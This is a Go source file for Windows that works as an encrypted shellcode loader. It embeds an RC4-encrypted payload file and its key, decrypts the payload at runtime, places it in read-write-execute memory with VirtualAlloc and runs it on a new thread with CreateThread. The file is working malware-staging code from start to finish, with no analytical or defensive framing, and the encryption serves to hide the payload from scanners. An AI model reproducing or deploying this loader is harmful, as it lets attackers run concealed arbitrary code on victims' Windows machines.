//go:build windows
// +build windows

package exec

import (
	"crypto/rc4"
	_ "embed"
	"errors"
	"fmt"
	"syscall"
	"unsafe"
)

// ==============================
// Embedded shellcode + key
// ==============================

//go:embed loader_encrypted.bin
var encryptedShellcode []byte

//go:embed key.txt
var rc4Key []byte

// ==============================
// Windows API
// ==============================

var (
	kernel32                = syscall.NewLazyDLL("kernel32.dll")
	procVirtualAlloc        = kernel32.NewProc("VirtualAlloc")
	procCreateThread        = kernel32.NewProc("CreateThread")
	procWaitForSingleObject = kernel32.NewProc("WaitForSingleObject")
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	INFINITE               = 0xFFFFFFFF
)

// ==============================
// Decrypt embedded shellcode
// ==============================

func Decrypt() ([]byte, error) {
	c, err := rc4.NewCipher(rc4Key)
	if err != nil {
		return nil, fmt.Errorf("rc4 init failed: %w", err)
	}
	if len(encryptedShellcode) == 0 {
		return nil, errors.New("no embedded shellcode")
	}
	dec := make([]byte, len(encryptedShellcode))
	c.XORKeyStream(dec, encryptedShellcode)
	return dec, nil
}

// ==============================
// Execute shellcode inline
// ==============================

func Execute(sc []byte) error {
	if len(sc) == 0 {
		return errors.New("no shellcode to execute")
	}

	// Allocate RWX memory
	addr, _, _ := procVirtualAlloc.Call(
		0,
		uintptr(len(sc)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_EXECUTE_READWRITE,
	)
	if addr == 0 {
		return errors.New("VirtualAlloc failed")
	}

	// Copy shellcode into allocated memory
	dst := (*[1 << 30]byte)(unsafe.Pointer(addr))
	copy(dst[:len(sc):len(sc)], sc)

	// Create thread at shellcode start
	hThread, _, _ := procCreateThread.Call(
		0,
		0,
		addr,
		0,
		0,
		0,
	)
	if hThread == 0 {
		return errors.New("CreateThread failed")
	}

	// Wait until thread finishes
	procWaitForSingleObject.Call(hThread, INFINITE)
	return nil
}
